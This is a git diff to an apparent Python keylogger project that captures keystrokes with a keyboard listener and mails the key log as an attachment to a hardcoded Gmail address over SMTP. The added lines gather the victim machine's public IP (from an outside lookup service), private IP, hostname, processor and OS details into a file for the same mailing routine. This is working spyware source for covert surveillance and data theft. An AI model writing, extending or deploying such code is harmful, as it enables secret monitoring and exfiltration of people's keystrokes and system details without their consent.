@@ -13,6 +13,7 @@ from email.quoprimime import body_check
 
 # Clipboard
 import win32clipboard
+from cryptography.x509 import IPAddress
 
 # Keys and Listener
 from pynput.keyboard import Key, Listener
@@ -33,13 +34,16 @@ from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
 keys_information = "keys_log.txt"
+system_information = "system_info.txt"
+
 file_path = "D:\\My GitHub\\rachit404\\python_keylogger\\MainProject\\"
 
 load_dotenv()
 fromaddr = os.getenv("EMAIL_SENDER")
 password = os.getenv("GMAIL_SMTP_PASSWORD")
-toaddr = "tempmail8user@gmail.com"
 # print("Password: ",password)
+toaddr = "tempmail8user@gmail.com"
+
 def send_mail(filename, attachment, toaddr):
     msg = MIMEMultipart()
     msg['From'] = fromaddr
@@ -66,8 +70,24 @@ def send_mail(filename, attachment, toaddr):
     text = msg.as_string()
     s.sendmail(fromaddr, toaddr, text)
     s.quit()
-
 send_mail(keys_information, file_path+keys_information, toaddr)
+
+def computer_information():
+    with open(file_path+system_information, "a") as f:
+        hostname = socket.gethostname()
+        IPAddress = socket.gethostbyname(hostname)
+        try:
+            public_ip = get("https://api.ipify.org").text
+            f.write("Public IP Address: "+public_ip)
+        except Exception:
+            f.write("Couldn't get Public IP Address (most likely max query)")
+
+        f.write("\nProcessor: " + (platform.processor()) + '\n')
+        f.write("System: " + platform.system() + " " + platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + '\n')
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + IPAddress + "\n")
+computer_information()
 
 count = 0
 keys = []
